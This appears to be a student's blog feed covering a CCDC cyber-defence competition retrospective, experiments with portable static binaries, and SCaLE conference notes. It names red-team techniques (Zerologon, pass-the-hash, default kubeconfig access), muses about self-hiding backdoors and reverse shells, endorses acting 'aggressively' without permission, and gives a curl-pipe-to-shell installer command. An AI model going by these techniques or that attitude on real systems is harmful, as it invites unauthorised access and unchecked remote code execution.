<li>More chain/linked injects than usual. Common in the real world.</li>
</ul>
<p>Red Team:</p>
<ul>
<li>Red team always wins. They don’t want people to make the mistakes that they did when we go into the real world.</li>
<li>Every time red time does something, they are trying to teach something.</li>
<li>Red team brought a radio jammer
<ul>
<li>Only one team passed the code signals test, by sending out people to talk to the red teamers and ask what they are doing, and then change their frequency</li>
</ul></li>
<li>Red team looks at Github and sees all the repos.</li>
<li>Red team doesn’t like when people do stuff that doesn’t translate to the real world, so they punish it.</li>
<li>Red team “gives more love” to teams that are aware they are on the systems.</li>
<li>Red team lost access to their boxes when vcenter when down becuase they forgot their changed ip address.</li>
<li>Red team keeps surprises so people can’t prep for what they do.</li>
<li>Red team did not do anything tricky, like 0 days the night before (nationals)… they simply searched for what’s vulnerable and what’s open.</li>
<li>“We love kubernetes”. K8s is new to the competition. To mitigate basics: change default kubeconfig or block 6443 api server. This is how they got in, and they would run pods, down pods, etc.
<ul>
<li>Forgejo has default creds in helm chart, changes could be pushed to fluxcd.</li>
<li>Look into environment variables and configurations of deployments. Helm values, etc.</li>
<li>Xtraop product manager says to Learn Kubernetes because people struggle to secure it in the real world.</li>
</ul></li>
<li>MITRE shows how people do attacks in the real world.</li>
<li>Windows: Zerologon, eternalblue, RPC, new C2 called Realm, static rust binary. 3 differenr tyows if C2: slitter, realm, cobalt strike.
<ul>
<li>Reset DC passwords, stole hashes, pass the hash.</li>
</ul></li>
<li>Watching connections, ssh logs. Large static binaries = suspicious, potential C2 server. Binary in tempt directory making outbound connections = suspicious.</li>
<li>Scully had ssh private key in root of scully. Make sure to clean those up.</li>
<li>Alpine router got pwned, 3 different ways to get admin access. Webmin/cockpit I think? They should be shut down.</li>
<li>Ragusa had a flask app with a command injection vuln. No team found it for the entire competirion. We need to be able to figure out how they got in and patch it.</li>
<li>Red team offered to do mock/scrimmages</li>
</ul>

<h2 class="anchored" data-anchor-id="preparation-methodology-adjustments">Preparation Methodology Adjustments</h2>
<ul>
<li>People need to learn scripting
<ul>
<li>Python for Linux</li>
<li>Powershell for Windows</li>
<li>People need to be able to write/edit scripts on the spot</li>
</ul></li>
<li>People need to drill the fundamentals. Overall lack of experience that can be fixed.
<ul>
<li>Set up stuff and tear it down.</li>
<li>Kubernetes interaction/ how to change certificate used to authenticate</li>
<li>docker-compose vs with space instead</li>
<li>DNS/proxy access to the environments</li>
<li>Be able to handle never before seen software thrown at us. Either rare stuff, or custom CCDC stuff.</li>
</ul></li>
<li>People are gonna need to specialize. I wanted to avoid this. But I can’t see a way around this. There isn’t enough time for every person to learn every software, as much as that’s what I want to do to prepare them for the real world</li>
<li>OSINT in general
<ul>
<li>But we should look at the Github’s of all other teams <em>and</em> competition organizers. There might be things like config files (kubernetes, or nix) in those git repos</li>
<li>Github code search. Search engines. People need to know how to search.</li>
</ul></li>
<li>Certain injects, like the ansible one’s, could be done “at home” and then we could reuse the code during comp.</li>
<li>Possibly drill to prepare endurance. Although music would have helped.</li>
<li>Drill for readiness with <em>specific</em> utility software: ssh, zellij, restic (?), SIEM
<ul>
<li>Also proxies</li>
<li>But it’s not worth it to attempt to memorize the environments, especially since they give us rare or custom services. It’s better to have a fundamental understanding.</li>
</ul></li>
<li>Drill to the point where people can still operate under pressure</li>
<li>Basic troubleshooting skills — Although I don’t think they were lacking, but instead people flustering under pressure.</li>
<li>Blogs people write to, rather than injects.</li>
<li>Weekly assignments that are discussed and done during the week.</li>
</ul>

<section id="things-to-prepare" class="level2">
<h2 class="anchored" data-anchor-id="things-to-prepare">Things to Prepare</h2>
<ul>
<li>Printouts
<ul>
<li>Ascii cheatsheet: Yeah. But we did actually need it for decoding the special signals being sent.</li>
<li>Documentation? Create our own team book/cheatsheets?</li>
<li><a href="https://wizardzines.com/">Julia Evans</a> cheatsheets would have helped a lot.</li>
<li>Pacman Rosetta</li>
<li><a href="https://www.sans.org/blog/the-ultimate-list-of-sans-cheat-sheets/">Sans cheatsheets</a>, <a href="https://imgv2-2-f.scribdassets.com/img/document/686774535/original/adfc0dbeca/1702226435?v=1">E.g: Linux</a></li>
<li>Other misc, UPDATED cheatsheets</li>
<li>Simpler passwords for our password sheets, or possibly cryptpad spreadsheet</li>
<li>Way more password sheets if we are going to do those. Like 16 instead of 6.</li>
</ul></li>
<li>Sticky notes for the computers, to have a “todo” for what to do on the workstation/related machines?
<ul>
<li>Blank sticky note = no password changed</li>
</ul></li>
<li>Physical Books
<ul>
<li>Unix handbook, or the LPIC books are really good for physical books documenting Linux.</li>
</ul></li>
<li>Custom Linux ISO that’s really small, possibly doesn’t need network, and has automatic install. This way we don’t need to click through the Debian installer.
<ul>
<li>Also find a good small live distro for physical machines, so that we can use things like <code>chntpw</code> or other recovery tools.</li>
</ul></li>
<li>Quarto and formatting:
<ul>
<li>I threw together something quick using Nix to install quarto to make an html revealjs presentation and it worked <em>really well</em>.</li>
<li>Do we <em>need</em> themed templates for docs? Quarto’s default dark is lame but extremely simple to use, vs custom document templates for every competition.
<ul>
<li>Or <a href="https://quarto.org/docs/authoring/brand.html">quarto brand.yml</a> for branding/templates</li>
</ul></li>
<li>Templates for presentations, injects.</li>
<li><code>embed-resources: true</code> to create self contained quarto revealjs and html. <a href="https://quarto.org/docs/output-formats/html-basics.html#self-contained">See docs</a></li>
</ul></li>
<li>Nmap scans in multiple output formats — including <strong>markdown tables</strong> of multiple kinds (service as table, machines as table, etc). Or as CSV’s.</li>
<li>SIEM solution…
<ul>
<li>Some way to log network connections for incident responses</li>
<li>Log network and traffic for software like Bishop41’s extremely insecure web based python dev environment</li>
</ul></li>
<li>Automate group policy — No more lockouts</li>
<li>Become able to consistently fix problems caused by red team on the Windows machines.</li>
<li>Learn the inject naming scheme.</li>
<li>Airgap ready: Part of our environment was airgapped. How do we set up services without google?
<ul>
<li>Physical docs, paper/books</li>
<li>Small, portable, transferable services
<ul>
<li>Terminal/Tui collaboration tools. Zellij, but also, does a collaborative text editor exist?</li>
</ul></li>
</ul></li>
<li>Some way of organizing work for easy handoff
<ul>
<li>The machines had virtual desktops but I didn’t use them (they didn’t show up on LinuxFX/Winux)</li>
</ul></li>
<li>Automated granular backups (restic?)
<ul>
<li>Deduplication</li>
<li>Just config, or data as well</li>
</ul></li>
<li>Use CIS benchmarks instead of Microsoft Docs when docs are bad</li>
<li>Ansible injects can probably be done in advance. We could do them at home as injects and then copy the code.</li>
<li>Some sort of backup software. Restic?</li>
<li>Set up honeypots/traps for lower privilege users (Windows, but Linux could do this as well).
<ul>
<li>Windows containers</li>
<li>Find ip’s, prevent privilege escalation</li>
</ul></li>
<li>Automation that could be run in the background so other people can work on the workstation</li>
<li>Some kind of pastebin service to share text/files/images.</li>
<li>Soar/Nix to install packages, or other custom/distro agnostic package managers
<ul>
<li>Nix for quarto. But texlive small is needed for pdf.</li>
<li>Soar for zellij, restic, some other static stuff.</li>
</ul></li>
<li>Easier passwords</li>
<li>Backdoors for the windows machines outside of a backup user/admin
<ul>
<li>Meshcentral? (also, can Meshcentral aggregate logs SIEM style?).</li>
</ul></li>
<li>Url shortener, self hosted</li>
<li>Clipboard managers. Built into KDE and Windows nowadays.</li>
<li>KDE is the best. Gnome lacks features.</li>
</ul>
<p>Software we need:</p>
<ul>
<li>Static binary, client-server</li>
<li>“clustered”, where instances can interact, possibly find eachother</li>
<li>Shell (reverse shell?) that are collaborative (zellij)</li>
<li>backup from any machine to any other (restic?)
<ul>
<li>Also need Windows backup (group policy, AD stuff, DNS) backup ability</li>
</ul></li>
<li>Forward, view and search logs from other machines
<ul>
<li><a href="https://lnav.org/">lnav</a>?</li>
<li>Also network traffic, basically Incident Response needs (source ip address, destination, time). Command history.</li>
</ul></li>
<li>Collaborative text editor or spreadsheet setup.
<ul>
<li>Inventory, passwords, injects</li>
</ul></li>
<li>Built in automation
<ul>
<li>Basic tasks</li>
<li>Machines add themselves to the inventory</li>
<li>Changes password as an install step</li>
</ul></li>
<li>Proxy traffic to other machines, to escape airgap</li>
<li>Pastebin/file sharing</li>
<li>Run on our own devices during competitions</li>
<li>Literally based on kubernetes?</li>
<li>Hide itself? The ability to disguise as other services?</li>
</ul>
<p>UCI: <a href="https://github.com/UCI-CCDC/LOCS/blob/b097d1adfad6037253c13a29bf811f045e77f151/linux/dominion/domlogging.py" class="uri">https://github.com/UCI-CCDC/LOCS/blob/b097d1adfad6037253c13a29bf811f045e77f151/linux/dominion/domlogging.py</a></p>
<p>Scripts for password shuffling, adding to SIEM, etc. They have many things we want. We should also look at other teams.</p>

<h2 class="anchored" data-anchor-id="preduring-comp">Pre/During Comp</h2>
<p>It should be noted that some of this is stuff we did during the competition that worked well, in addition to things we didn’t do but should have.</p>
<ul>
<li>Stop assuming instructions are perfect.
<ul>
<li>Every team packet has had at least one thing incorrect. A machine not existing but documented, vice versa, changed ip addresses, etc</li>
<li>The proxy didn’t work because the instructions weren’t perfect. Eventually we requested help from Black Team and they did but we can experiment more with instructions on our own.</li>
<li>No hate to Ops Team. But it’s a complex competition and that means things will go wrong. We just gotta adapt.</li>
</ul></li>
<li>Cryptpad: We could have and should have used a public instance for injects that needed collaboration
<ul>
<li>And cryptpad has a kanban board for task organization</li>
<li>Possibly password sheet as well</li>
<li>Use link shortener to find/share it easily.</li>
</ul></li>
<li>Reuse injects if they reuse machines</li>
<li>Backup admin accounts on the machines. Could probably be automated.</li>
<li>Clipboard manager… please</li>
<li>I misspelled the password when writing it down…
<ul>
<li>We should have brought the other sheet, having multiple people write the passwowrd down.</li>
<li>Have physical backups and redundancies as well?</li>
</ul></li>
<li>Add machines to spreadsheet inventory as part of first steps
<ul>
<li>Along with password, and documenting what password is used via coordinates.</li>
</ul></li>
</ul>

<section id="notes" class="level2">
<h2 class="anchored" data-anchor-id="notes">Notes</h2>
<p>This is that passed down knowledge that we are lacking.</p>
<ul>
<li>I didn’t know dockerizing services was acceptable, but I overheard one team mention this, and it was also mentioned in the discord as the accepted strategy to secure one the flask web app that let the users run arbitrary python code as root on the machines.</li>
<li>ALL the teams did better than us. But one team unplugged Coastline Collges non-ccdc networking equipment.
<ul>
<li>One team unplugged the “magic box” the scoring engine used.</li>
<li>It’s probably much better to be much more aggressive and ask for forgiveness rather than permission.</li>

<li>Injects, including presentations, only in pdf format.</li>
<li>Winget was installed on at least one of the windows machines.</li>
<li>Active Directory doesn’t work in safe mode.</li>
<li>Red team did not get an empty “test environment”. There was a half sized environment managed by Anthropic Claude though. It did’t do too well.</li>
<li>There was actually an inject to set up a data flow between hi side and low side</li>
<li>There as an inject about setting up a new unify switch before they took our old one away, and there was an announcement about migrating the services from one kubernetes clusters before they took the small NUC with the kubernetes on it as well.</li>

<li>CCDC playlist: Since we had internet access, we should have put some bops on
<ul>
<li>In all serious, this would have helped with our motivation greatly.</li>
<li>One team was watching a fortnite stream (though this was an image from a previous year). Everybody goes “haha funny fortnite” but in all seriousness, watching twitch streams acts as an external source of motivation for me while I work on longer projects. I watch either people new to horror games, or software/cybersec stuff, because I enjoy seeing people suffer.</li>
</ul></li>
<li>Get the model of Coastline’s college presentation windows machine — I love it’s form factor, it’s quite small. I forgot. <code>:(</code>. Oh well.</li>
<li>I should write my lowercase l in such a way where it’s clear what they are</li>
<li>More pencils. I should also bring my own notebook.</li>
<li>Cutleries? It would be nice if we had a knife for the cream cheese so we could put it on the bagels.</li>
<li>Scissors and printer paper (I want to do origami)</li>
<li>Amazon makes customm hoodies. They aren’t good, apparently, but you can just submit an image to go on a hoodie.</li>

<li>Datto brand device, running Debian 12 was a “magic box” used for Black Team. But I really liked the form factor of that device, it was quite small, like a NUC.</li>
<li>Apparently, Insurance companies find red teamers highly valuable, since they can assess risk in companies that they insure for cyber attacks.</li>

<li>Weekly assignments assigned on saturday, and then done and discussed during the week</li>
<li>Team leader who managed rather than operating directly, they wouldn’t have their hands on a keyboard.</li>
<li>Inject person who is timekeeper and bugging people to do things</li>
<li>Team composition: 2 networking 2 linux 2 windows, all problem solvers. Figure it out if you don’t know. Not necessary specialize, but at least cross train.</li>
<li>Argued that we should have just taken a laptop to low side

  <title>Portable executable experiments for CCDC</title>
  <link>./playground/ape-experiments/</link>
  <description><![CDATA[ 





<p>The college I am going to has a team that comeptes in a competition called <a href="https://en.wikipedia.org/wiki/National_Collegiate_Cyber_Defense_Competition">CCDC</a>, which is a blue team cybersecurity competition. It involves securing misconfigured, outdated OS’s and services, while being asked to do tasks called “injects”, and protecting a highly vulnerable environment from “red teamers” — competition organizers who play the role of a hypothetical attacker.</p>
<p>One of the big problems encountered in CCDC is the portability of applications. Competitors will be asked to work across a variety of Linux distros, of various types and various package versions, and even across the BSD versions. Of course, sometimes the solution is simple: install your tools, like python or tmux, from the package manager on every Linux/BSD OS.</p>
<p>The second problem is that the organizers of the competition may break our package managers. Deleting repos, or giving us a distro without a package manager, or giving us End-Of-Life distributions, with dead repositories.</p>
<p>And also, we aren’t allowed to do a distribution release upgrade. So we can’t go from CentOS 8 to CentOS Stream or other things like that. We also aren’t allowed to replace non-containerized scored services with containers. We also aren’t allowed to replace scored services with another application of the same type, so no replacing Apache with Caddy.</p>
<p>However, we can use static executables to replace services, and there are real limits on what kind of utilities we can deploy, other than resources usage (Linux/BSD machines usually have 2 gigabytes of ram).</p>
<p>I was looking into portable executables, to mitigate some of the problems and restrictions. I would like to have a portable version of python, so that ansible playbooks relating to firewall automation and backups can be run as soon as possible, and also a portable terminal multiplexer, so that our team members can collaborate directly. I would also like portable (statically compiled) versions of some of the services, so that we can replace them in place, rather than being forced to rely on a package manager that may not work.</p>
<section id="apecosmo" class="level1">
<h1>Ape/Cosmo</h1>
<p><a href="https://justine.lol/cosmopolitan/index.html">Cosmopolitan</a> is a project that turns C into build once, run anywhere language. It works by creating a fat binary that contains code for all other operating systems, including UEFI, and then dynamically figuring out where it is being run.</p>
<p>There are some precompiled binaries for ape as well:</p>
<ul>
<li><a href="https://github.com/ahgamut/superconfigure/releases" class="uri">https://github.com/ahgamut/superconfigure/releases</a></li>
<li><a href="https://cosmo.zip/pub/cosmos/bin/" class="uri">https://cosmo.zip/pub/cosmos/bin/</a></li>
</ul>
<p>Some of these tools are very interesting, in particular <code>tmux</code> and <code>python</code>. Ansible requires python to be on the machines, but it can be difficult to get python on a machine, especially if the package manager is broken. I can easily imagine something like:</p>
<p><code>cat staticpython | ssh hostname "cat &gt; remotestaticssh"</code></p>
<p>The above would enable us to get a version of staticly compiled python on anything with ssh, and only ssh needed. There are also some <a href="https://superuser.com/questions/291423/how-to-copy-a-file-without-using-scp-inside-an-ssh-session">other ways to do it</a>.</p>
<p>I download an actually portable version of tmux and python, and attempt to run them (the test is to see if they still work without glibc, which is often a limitation of portability for many other portable binaries).</p>

<p>My Arch Linux install attempts to use wine to load up the python program. There are also issues quitting, and I end up having to use pkill to kill python. This is because my OS attempts to use <a href="https://en.wikipedia.org/wiki/Binfmt_misc">binfmt_misc</a>, and finds out that Wine is an acceptable program for launching ape binaries. ape binaries are not designed to run under wine, this behavior happens instead.</p>
<p>The way to avoid this is to use the <a href="https://justine.lol/apeloader/">ape loader</a>.</p>

<p>And tmux just won’t load, although it will print the help output. I find this very weird, as I could get tmux to load earlier, but not now. It doesn’t load on my host system, or in an Debian or Alpine container.</p>
<p>This only seems to apply to the ape tmux, as tmux installed by apt in a debian container doesn’t have this issue, and then after that, tmux is able to start sessions normally, but then it can’t again after I kill all sessions. At least this isolates it to an issue with ape.</p>
<p>It could just be a bug of some sort, but the package version only updated 3 days ago from now (August 6th), so those haven’t changed.</p>
<p>The weirdest thing is that the ape tmux is actually able to work normally… but only after I launch a session via non-ape tmux. And then, one I kill all tmux sessions, then it stops working again.</p>
<p>It seems like the ape tmux is having trouble starting the server:</p>
<div class="sourceCode" id="cb4" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb4-1">/stuff # ape ./tmux start-server</span>

<span id="cb4-3">/stuff # ape ./tmux ls</span>
<span id="cb4-4">no server running on /tmp/tmux-0/default</span></code></pre></div>
<p>I found a <a href="https://github.com/tmux/tmux/issues/736">half relevant issue</a>, but the failed solution gives me more answers:</p>
<div class="sourceCode" id="cb5" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb5-1">/stuff # ape ./tmux new-session -t testing -d</span>

<p>I eventually made a post on the redbean discord server, and uploaded my <a href="https://gist.github.com/moonpiedumplings/809dcc89cfe289f8341aae85069a57e1">strace to a github gist</a>. I’ll wait to see if anyone replies.</p>
<div class="sourceCode" id="cb6" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb6-1">[moonpie@lizard apeb]$ ./ape-x86_64.elf ./tmux new-session -d -vv</span>

<span id="cb7-2">no server running on /tmp/tmux-0/default</span></code></pre></div>
<p>So tmux can be ran with -vv for something more verbose.</p>
<p>This might also be a tmux bug, since the version of tmux provided by ape/cosmo is 3.3a, rather than the latest 3.4, however, the nix bundled tmux also has this issue, and nix has 3.4 of tmux.</p>
<p>I played around with attempting to build newer versions of tmux from the <a href="https://github.com/ahgamut/superconfigure?tab=readme-ov-file#how-can-i-build-these-locally">superconfigure</a> github repo, but their instructions don’t seem to work. The scripts assume Ubuntu 22 LTS, although I was only able to find that out after looking at what distro was used in their github actions.</p>

<section id="nix-bundle" class="level1">
<h1>Nix bundle</h1>
<p><code>nix bundle nixpkgs#programname</code> is a command that bundles a program into a self extracting archive that uses proot to run itself. A big problem with nix bundle is that it mostly only works on Linux, and relying on proot makes it less portable compared to ape. <a href="https://nix.dev/manual/nix/2.13/command-ref/new-cli/nix3-bundle">Here is the official manual</a>… on an unofficial site.</p>
<div class="sourceCode" id="cb11" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb11-1">[moonpie@lizard apeb]$ nix bundle nixpkgs#zellij</span>

<p>One thing that is mildly annoying is that nix builds stuff in the nix store, and then symlinks to it from the outside, meaning you have to copy out the binary first.</p>
<p>The first thing I tried to do was bundle zellij and tmux, and funnily enough, they run into the exact same issue as ape. If I launch a zellij or tmux session using a non-ape, non nix-bundled session, first, then I can use the nix bundled zellij or tmux normally.</p>
</section>
<section id="guix-pack" class="level1">
<h1>Guix pack</h1>
<p>Guix pack is different. Rather than doing self extracting or staticly compiled executables, it generates a tarball (or docker image, but I’m focused on tarball), which can be extracted and has the programs with a vendored dependency.</p>
<p>I found a <a href="https://hub.docker.com/r/metacall/guix">docker container for guix</a>, which is good because I’d rather run guix entirely in a podman container in my home volume, to avoid snapshotting guix in btrfs snapshots of the root subvolume.</p>
<p><code>podman run -it --rm -v ".:/stuff" --privileged</code></p>
<p>I had to run it with –privileged, otherwise the guix builder fails.</p>
<p>Once inside, the <code>guix pack</code> command packs programs into a tarball. <a href="https://guix.gnu.org/manual/en/html_node/Invoking-guix-pack.html">Documentation</a></p>
<p><code>guix pack -RR tmux</code> generates a tarball… but I’m struggling to run it outside the store.</p>
</section>
<section id="appimage" class="level1">
<h1>Appimage</h1>
<p>Appimages are good, but with a few caveats: They only work on Linux, and they require fuse2 (not fuse3, but fuse2) to run, and they rely on the same version of glibc.</p>
<p>There are some <a href="https://github.com/tmux/tmux/wiki/Installing#appimage-package">prebuilt appimages for tmux</a> and it works fine after I install fuse2.</p>

<h1>Static Compilation</h1>
<section id="tmux" class="level2">
<h2 class="anchored" data-anchor-id="tmux">Tmux</h2>
<p><a href="https://github.com/tmux/tmux/wiki/Installing">tmux has instructions for installing</a>.</p>
<p><code>apk add git gcc musl-dev openssl-dev openssl-libs-static openssl ncurses-terminfo</code></p>
<p>After these packages are installed, compiling tmux staticly will work. (it should be noted that the instructions assume you use the relase tarball, rather than directly from the source code).</p>
<div class="sourceCode" id="cb12" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb12-1">./configure --enable-static</span>

<span id="cb13-2">can't find terminfo database</span></code></pre></div>
<p>The staticly compiled tmux doesn’t include ncurses and terminfo libraries. After installing <code>ncurses-terminfo</code> then it works fine.</p>
<p>Apparently it’s possible to staticly bundle ncurses, libevent, and tmux, but it’s an even more involved process. Users must compile ncurses, which generates .a files and then link those to tmux when compiling using LIBS and -l flag to link it.</p>

<h1>Soar (Previously Toolpacks)</h1>
<p>I recently learned about a new project, called <a href="https://github.com/Azathothas/Toolpacks">Toolpacks</a>. Toolpacks is a truly massive set of static binaries, with so many utilities, including zellij, tmux, ssh, and many others. I see 2292 binaries for x86_64 Linux, and good amounts for Windows and Arm Linux as well.</p>
<p>Another cool thing about Toolpacks is that they also provide <a href="https://en.wikipedia.org/wiki/UPX">UPX</a> versions of the software they distribute. UPX is a method of creating self extracting, compressed binaries that further saves space. For example:</p>
<div class="sourceCode" id="cb19" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb19-1">[moonpie@lizard toolpack]$ du -sh zellij</span>
<span id="cb19-2">30M     zellij</span>
<span id="cb19-3">[moonpie@lizard toolpack]$ du -sh zellij.upx</span>
<span id="cb19-4">8.6M    zellij.upx</span></code></pre></div>
<p>That’s a pretty big reduction on the zellij binary, which is one of the largest binaries I’ve seen. Interesting, they also have caddy, and nginx. I find this very promising.</p>
<p>There are also builds of busybox or toybox, which could replace coreutils in a pinch on Linux machines. There are a few other interesting one’s, such as <a href="https://github.com/vdjagilev/nmap-formatter">nmap-formatter</a>, a software that can format nmap XML output and convert it to CSV or other formats, which we may find easier to submit.</p>
<p>Lately, this toolpacks project has been merged into a another project, <a href="https://github.com/pkgforge/soarpkgs">soarpkgs</a>. This is essentially a “package repository” for the new package manager, <a href="https://github.com/pkgforge/soar">soar</a>.</p>

<p><code>curl -fsSL https://soar.qaidvoid.dev/install.sh | sh</code></p>
<p>But, then it doesn’t install packages in a location accessible to the path by default.</p>
<pre><code>soar install zellij

some stuff omitted for brevity

  Notes:

<p>And this file location isn’t accessible in the path by default.</p>
<p>It seems that I can use <code>soar run packagename</code> in order to run packages without installing them, similar to nix. But this isn’t really what I want either.</p>
<p>A much better way is to use <code>soar download</code> (or <code>soar dl</code>) to download the packages we want.</p>
<p>So:</p>
<pre><code>root@2972c8731770:/usr/local/bin# soar dl rsync

<h1>StailX</h1>
<p><a href="https://stal-ix.github.io/" class="uri">https://stal-ix.github.io/</a></p>
<p>Stal-IX is similar to Soar, a distro agnostic package manager that focuses on the installation of static binaries.</p>
<p>It’s a very interesting and promising project, but the install steps are <a href="https://stal-ix.github.io/INSTALL.html">quite complex</a>, so I don’t think it’s suitable for our usecase.</p>
</section>
<section id="dockerc" class="level1">
<h1>Dockerc</h1>
<p><a href="https://github.com/NilsIrl/dockerc">Dockerc</a> is a project that compiles a docker container to a static executable, by bundling the runtime. I discovered this because it was packaged on the Toolpacks listed above.</p>
<p>Because it is a container, I’m going to assume that this solution only works on Linux — but that doesn’t mean it’s not useful.</p>
<div class="sourceCode" id="cb22" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb22-1">vagrant@debian10:~$ sudo dockerc --image docker://library/httpd -o httpd --rootfull</span>
<span id="cb22-2">vagrant@debian10:~$ sudo ./httpd</span>
<span id="cb22-3">unknown argument ignored: lazytime</span>
<span id="cb22-4">AH00557: httpd: apr_sockaddr_info_get() failed for umoci-default</span>
<span id="cb22-5">AH00557: httpd: apr_sockaddr_info_ge....</span></code></pre></div>
<p>And it works — kinda. httpd doesn’t seem to bind an address. However, if I use an alpine container (which starts a shell), and then test with <code>python -m http.server</code>, that binds an address to the same localhost as the alpine machine.</p>
<div class="sourceCode" id="cb23" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb23-1">sudo dockerc --image docker://docker.io/library/nginx --output nginx --rootfull</span>
<span id="cb23-2"></span>
<span id="cb23-3">sudo ./nginx</span></code></pre></div>
<p>This also does not bind ports.</p>

<h2 class="anchored" data-anchor-id="pkgin">pkgin</h2>

<p>Pkgin is a package manager that can manage packages compiled by <a href="https://www.pkgsrc.org/">pkgsrc</a>. It works on multiple BSDs (including Dragonfly), Macos, and Debian Linux. I don’t think we’ll ever see OpenSolaris but we’ll see.</p>

<section id="scale-22" class="level1">
<h1>Scale 22</h1>
<p>This is my second time going to the <a href="https://socallinuxexpo.org/">so cal linux expo</a>, AKA SCaLE. It’s very exciting, and this time I will take notes of the things I see.</p>
<p>The big things I am excited for is:</p>
<ul>
<li>Nix (PlanetNix)</li>
<li>Kubernetes (Cloud Native Days and DevopsDaysLA)
<ul>
<li>There used to be Kubecon but not this year, instead it’s Cloud Native Days.</li>
</ul></li>
<li>Openstack (Openinfra days is here, they weren’t here last time)</li>
<li>Friends! (I met many people from LA and near Pasadena, and I am excited to see them here as well)</li>
</ul>
</section>
<section id="openinfra-days" class="level1">
<h1>OpenInfra Days</h1>
<p>I went to the first meeting, and was immediately introduced to an interesting software — <a href="https://docs.rackspacecloud.com/genestack-components/">genestack</a>. Unlike openstack helm, it doesn’t seem to <em>require</em> rook ceph, despite being a kubernetes deployment, which makes it very appealing. Currently, I am attempting to deploy Openstack on my single Kubernetes server, using FluxCD and Openstack-helm, but I am encountering a blockage because ceph doesn’t like being deployed on a single node.</p>
<section id="kubernetes-as-a-geographically-distributed-system" class="level2">
<h2 class="anchored" data-anchor-id="kubernetes-as-a-geographically-distributed-system">Kubernetes as a Geographically Distributed System</h2>
<p><a href="https://www.socallinuxexpo.org/scale/22x/presentations/kubernetes-geographically-distributed-system" class="uri">https://www.socallinuxexpo.org/scale/22x/presentations/kubernetes-geographically-distributed-system</a></p>
<p>This presentation is about StarlingX, which is noted below. It’s a very interesting piece of software.</p>
<p>StarlingX:</p>
<ul>
<li>Started 7 years ago</li>
<li>Built for “edge computing”</li>
<li>All of the system services and components are deployed in containers</li>
<li>Sees heavy use in the telecommunications sectors</li>
</ul>
<p>More discussion of Kata-Containers, it seems that they use it for security at the edge. It can also be used for multi-tenancy.</p>
<p>Deployment models:</p>
<ul>
<li>One/two server models</li>
<li>Ceph for storage, can use ceph on one node deployments
<ul>
<li>Can use external ceph for larger deployments</li>
</ul></li>
<li>Control, storage, and worker nodes</li>
<li>AIO (all in one) simplex:
<ul>
<li>No high availability or redundancy</li>
</ul></li>
<li>AIO Duplex: Two nodes, so if one fails the setup stays up</li>
<li>Standard: Two controller nodes (with storage) and then a worker/compute node</li>
<li>Some nodes can be used as storage nodes regardless</li>
</ul>
<p>Distributed Cloud:</p>
<ul>
<li>INtroduced in 3.0</li>
<li>Hetegenerous kubernetes/openstack environment</li>
<li>Central cloud, a controller cloud
<ul>
<li>Horizon dashboard, docker registry, keystone</li>
</ul></li>
<li>Remote, geographically dispered edge clouds
<ul>
<li>They are semi-autonomous, meaning they work without network</li>
</ul></li>
<li>Distributed control plane</li>
</ul>
<p>Resiliencey/Geo redundancy</p>
<ul>
<li>If a natural disaster/etc happens, the system doesn’t go down</li>
<li>If one cluster goes down, the system stays up</li>
</ul>
<p>Management:</p>
<ul>
<li>Tools to configure pxeboot, lifecycle, health and sensors</li>
<li>Monitoring of stuff</li>
<li>BMC/IPMI management things</li>
<li>Service management, configures high availability profiles</li>
<li>Auto update software, and/or add more functionality
<ul>
<li>Rolling updates</li>
</ul></li>
</ul>
<p>StarlingX is used heavily in the Telecom segments:</p>
<ul>
<li>They require 5 9’s of uptime. They require less than 5 minutes of downtime for a whole <strong>YEAR</strong> of uptime.</li>
</ul>
<p>New things in 10.0:</p>
<ul>
<li>Ipv4/v6 dual stack</li>
<li>Kata containers support</li>
<li>Managing up to 5,000 sites per system controler</li>
<li>Unified software management</li>
<li>Switch between standard and/or low latency kernel at runtime
<ul>
<li>Low latency sounds cool but has higher resource usage and resource needs. Presenter suggests sticking with standards unless you require specific things.</li>
</ul></li>
</ul>
<p>Telecom deployment things:</p>
<ul>
<li>StarlingX is used in 5G deployments?!
<ul>
<li>“Highly Utilized”</li>
<li>Small footprint.</li>
</ul></li>
<li>Precision time protocol</li>
</ul>
<p>Smallest deployment needs 1 cpu core.</p>
<p><a href="https://starlingx.io/blog" class="uri">https://starlingx.io/blog</a></p>
<p>Interesting software/product list:</p>

<ul>
<li>Similar project mentioned: Confidential containers</li>
</ul></li>
<li><a href="https://www.starlingx.io/">StarlingX</a>
<ul>
<li>Linux, Debian, Kubernetes, Openstack (on kubernetes), seems to be a Linux distro, they offer an ISO.</li>

<h1>PlanetNix</h1>
<p>According to the Flox intro presenter, there is a blog about getting Nix to run on Windows.</p>
<section id="tvix-replit" class="level2">
<h2 class="anchored" data-anchor-id="tvix-replit">Tvix / Replit</h2>
<p>Replit used to use nix, and then they switched to the tvix implementation of the nix daemon. Unlike Nix, it uses a content addressable store, leading to massive storage savings when deduplication. They compressed their database from 6 terabytes to 1.2 terabytes. Incremental updates don’t take as much space, and it’s much cehaper overall.</p>

<p>Flakes don’t support passing of command line arguments, Eelco has a solution. This solution maintains benefits of nix, like hermeticity, caching, and discoverability.</p>
<p>Interesting software/product list:</p>
<ul>
<li><a href="https://flox.dev/">Flox</a> — Flox uses nix packages, but aims to be a more user friendly abstraction layer</li>

<section id="embedded-programming-workshop" class="level1">
<h1>Embedded Programming Workshop</h1>
<p>I saw an embedded programming workshop, running during lunch when the Openstack stuff and Nix stuff was put on holds.</p>
<p>Firstly, I got a free board! One of <a href="https://www.amazon.com/STM32-Nucleo-Development-STM32F446RE-NUCLEO-F446RE/dp/B01I8XLEM8">these</a>. It doesn’t run an operating system, so the presenter referred to it as “bare metal C”</p>
<p>Tools needed: <code>gcc stlink stlink-gui stlink-tool stm32loader stm32flash</code> * Eclipse, C extension, STM extension which can be found <a href="https://www.openstm32.org">here</a></p>
<p>Setup: Chown the /dev/ttyACM0 to be owned by your user.</p>
